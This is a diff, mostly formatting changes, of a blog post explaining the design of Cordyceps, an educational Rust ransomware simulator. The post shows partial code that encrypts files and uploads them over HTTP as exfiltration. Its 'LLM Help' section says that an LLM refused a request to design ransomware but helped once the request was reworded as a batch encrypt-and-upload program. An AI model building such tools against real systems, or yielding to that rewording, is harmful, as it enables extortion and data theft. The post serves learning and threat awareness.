@@ -20,8 +20,8 @@ I won't dive into implementation details here. Check the code comments for in-de
 This post is based on [Cordyceps v0.8.0](https://github.com/lopes/cordyceps/releases/tag/v0.8.0). Future versions may change some behaviors described here.
 :::
 
-
 ## Project Overview
+
 Before writing a single line of code, I defined the project's structure and goals. Cordyceps is a command-line application written in Rust that simulates ransomware behavior for educational purposes. The project is divided into six modules: `main`, `cli`, `core`, `crypto`, `net`, and `error`.
 
 - `main`: Application entry point.
@@ -33,8 +33,8 @@ Before writing a single line of code, I defined the project's structure and goal
 
 The application is modular and extensible; each module has a clear responsibility.
 
-
 ## Modules
+
 Following Rust's best practices for organization, Cordyceps is structured into six modules. The `main` module boots the app, `cli` parses user intent, and `core` orchestrates operations, delegating tasks to the `crypto` and `net` modules. The `error` module provides shared error types. The diagram below provides a graphical overview, and in the following sections, we'll delve into each module in that order.
 
 ```{mermaid}
@@ -47,6 +47,7 @@ flowchart LR
 ```
 
 ### main
+
 This is the application's entry point and its simplest module. It registers all other modules with the `mod` keyword and calls the function that runs the program. The `main.rs` file starts with documentation comments (`//!`), which `cargo doc` uses to build the project's documentation. It's a simple and elegant way to keep documentation right next to the code it describes.
 
 ```rust
@@ -65,6 +66,7 @@ Pay special attention to `if let Err(e) = cli::run()`. This is a great example o
 If an error makes it this far, we log it and exit with a non-zero status code. Otherwise, the program finishes successfully.
 
 ### cli
+
 This module handles parsing command-line arguments, creating the bridge between the user and the application's features. Note the `///` comments here; they work with `//!` to document specific parts of the code, all of which contribute to the project's documentation. Run `cargo doc --open` to see the magic 🪄.
 
 ```rust
@@ -141,6 +143,7 @@ mod tests {
 Finally, the `cli` module contains its own `tests` submodule. The `#[cfg(test)]` attribute tells Rust to compile this module only when running `cargo test`. I find this an excellent way to keep tests close to the code they are testing. Since tests don't run from a real command line, we use `Cli::parse_from` to simulate providing arguments and then assert that they were parsed correctly.
 
 ### error
+
 Before we continue, let's take a breath and look at the `error` module 🧘. Error handling in Rust can be tricky because every error has a distinct type. To avoid a mess of error conversions, I created a dedicated module to define our own custom error types. This unifies all the different kinds of errors our dependencies can throw.
 
 Implementing the standard `Error` and `Display` traits involves some boilerplate, so I brought in the excellent [thiserror](https://crates.io/crates/thiserror) crate to help. Like `clap`, `thiserror` lets us add functionality declaratively with attributes.
@@ -157,7 +160,7 @@ pub enum CryptoError {
 pub enum AppError {
     #[error("Cryptographic operation failed: {0}")]
     Crypto(#[from] CryptoError),
-		// ...
+  // ...
 }
 ```
 
@@ -166,6 +169,7 @@ We define two enums, `CryptoError` and `AppError`. Both derive `thiserror::Error
 I won't detail every error variant, but the key takeaway is that if a function that can return an `io::Error` needs to return our `CryptoError`, the `#[from]` macro handles the conversion automatically.
 
 ### core
+
 Fasten your seatbelts, because from here things start to get wild 💨. `core` is the module that implements our core operations, acting as Cordyceps's nervous system 🧠.
 
 ```rust
@@ -212,16 +216,16 @@ pub fn disinfect(
     key: &Path,
     no_delete: bool
 ) -> Result<(), AppError> {
-		// ...
+  // ...
 ```
 
 As its name suggests, `disinfect` reverses the `sporulate` process. It traverses directories looking for `.zombie` files and passes them to the `decrypt` function in the `crypto` module.
 
 ```rust
 pub fn germinate(
-		path: &Path
+  path: &Path
 ) -> Result<(), AppError> {
-		// ...
+  // ...
 ```
 
 The last of our core functions is `germinate`. This function generates a Curve25519 key pair for our encryption and decryption routines. The cryptography details are explained in the `docs/cryptography.md` file in the Cordyceps' repository, but we'll look at the implementation here.
@@ -235,13 +239,14 @@ let (private_key, public_key) = generate_keypair()?;
 ```rust
 let decoded_prikey = b64_decode(&private_key_b64)?;
 if decoded_prikey != *private_key.as_bytes() {
-		return Err(AppError::Crypto(CryptoError::KeyVerification));
+  return Err(AppError::Crypto(CryptoError::KeyVerification));
 }
 ```
 
 Since key generation is a crucial step, we verify that the process is reversible by decoding the keys and comparing them to the originals. If the check fails, we return an error immediately. Otherwise, the function returns `Ok(())` to signal success.
 
 ### crypto
+
 This is the densest and arguably most complex module in Cordyceps. As the name suggests, `crypto` implements all cryptographic routines. This is a complex topic, fully documented in `docs/cryptography.md`. This section will build on that documentation, focusing on the implementation details rather than the cryptographic theory.
 
 ```rust
@@ -286,7 +291,7 @@ Notice the function signature: `fn write_to<W: Write>(&self, mut writer: W)`. By
 ```rust
 let mut file = File::open(path)?;
 let file_size =
-		usize::try_from(file.metadata()?.len()).map_err(|_| CryptoError::FileTooLarge)?;
+  usize::try_from(file.metadata()?.len()).map_err(|_| CryptoError::FileTooLarge)?;
 let mut plaintext = Vec::with_capacity(file_size);
 file.read_to_end(&mut plaintext)?;
 debug!("Read {} bytes from {:?}", plaintext.len(), path);
@@ -340,6 +345,7 @@ let plaintext = cipher_file_aes_gcm
 The `decrypt` function reverses this process. It reads the header, re-derives the shared secret, decrypts the file key, and finally decrypts the file content. AES-GCM is an AEAD cipher, which means it provides authentication in addition to confidentiality. The GCM authentication tag ensures the data hasn't been tampered with. If the tag is invalid, our `map_err` logic catches the specific error and returns our custom `CryptoError::AuthenticationTag`, preventing the program from using corrupted data.
 
 ### net
+
 The `net` module is responsible for exfiltration, uploading the encrypted `.zombie` files over HTTP.
 
 ```rust
@@ -368,8 +374,8 @@ To make the upload process more resilient, we sanitize filenames. This avoids is
 let file_content = fs::read(local_path).await?;
 
 let file_part = multipart::Part::bytes(file_content)
-		.file_name(final_file_name)
-		.mime_str("application/octet-stream")?;
+  .file_name(final_file_name)
+  .mime_str("application/octet-stream")?;
 let form = multipart::Form::new().part("files", file_part);
 
 let response = client.post(&url).multipart(form).send().await?;
@@ -377,11 +383,12 @@ let response = client.post(&url).multipart(form).send().await?;
 
 This code prepares a standard `multipart/form-data` request. We load the entire file into memory and wrap it in a `reqwest::multipart::Part`. This `Part` is then added to a `Form`, which is sent as the request body. As noted in the code's TODOs, a better practice for large files would be to stream the file from disk rather than loading it all into memory. Wrapping the content in a `Part` is a convenient abstraction that [reqwest](https://crates.io/crates/reqwest) provides, simplifying the process of building the multipart request.
 
-
 ## LLM Help
+
 I used multiple LLMs to brainstorm features and code ideas. Interestingly, when I asked an LLM to "help me design a ransomware," it immediately answered, *"I can't do that."* However, asking it to "help me design a program that encrypts files in batch and sends them over the network" was enough to get helpful guidance. In this sense, they acted as useful assistants, providing insights ranging from needed documentation to good crates to use. When it came to coding, they provided invaluable insights on things like how to use a given crate or how to make the code more efficient, like suggesting `HashSet` for exclusion lists.
 
 However, I always treated LLM output as suggestions, not as authoritative code to be blindly pasted. My workflow was:
+
 1. Understand the proposed change.
 2. Type the suggested code (no editor integrations).
 3. Compile and fix issues raised by the compiler.
@@ -390,25 +397,28 @@ One recurring issue I found was that crate APIs sometimes change quickly, and LL
 
 A recurring risk is *vibe coding* 🌈: using LLM-generated code without understanding it. LLMs produce confident answers, which can amplify this problem. It's up to the developer to validate results and learn the underlying concepts. However, this same pitfall can be a double-edged sword for threat actors, as a non-skilled person is now able to leverage models to create their own version of malware, which significantly increases the threat landscape ⚠️.
 
-
 ## Issues and TODOs
+
 During development, several improvements were identified, also marked as `TODO` in the code:
 
 ### Performance
+
 - **Concurrent uploads:** `core::sporulate` uploads files sequentially. Using `tokio` tasks for concurrent uploads will reduce the total runtime.
 - **Parallel encryption/decryption:** Parallelize `sporulate`/`disinfect` to leverage multi-core systems.
 - **Streaming I/O:** Replace full-file reads in `crypto::encrypt`, `crypto::decrypt`, and `net::upload_file` with streaming to reduce memory usage and support large files.
 
 ### Code Structure and Design
+
 - **Separation of concerns:** `crypto::encrypt` and `crypto::decrypt` mix crypto with file I/O. Splitting them improves testability.
 - **Generic key loading:** Replace `load_private_key` and `load_public_key` with a generic `load_key<K>(path: &Path)` to reduce code duplication.
 - **Key file format:** `germinate` writes raw Base64-encoded keys; adding contextual formatting (e.g., JSON) would make key files more robust.
 
 ### Dependencies
+
 - **Deprecated crates:** This project uses some deprecated crates due to transitive dependencies—when a dependency of your dependency is outdated or has a conflict. Overcoming these issues is important to use the latest versions of these crates.
 
-
 ## Conclusion
+
 Building **Cordyceps** was a challenging and rewarding way to learn Rust 💪. The project forced me to dive into Rust's module system, error handling, concurrency, and cryptographic primitives.
 
 Through this project, I learned in practice things I had read in *The Rust Programming Language* book and was able to experience some real-world issues, like transitive dependencies and error handling, realizing that Rust is not as perfect as some preach. I also discovered important crates in the Rust ecosystem that extend the language and simplify development. Implementing an ECIES-like scheme from scratch deepened my understanding of asymmetric and symmetric crypto interactions.
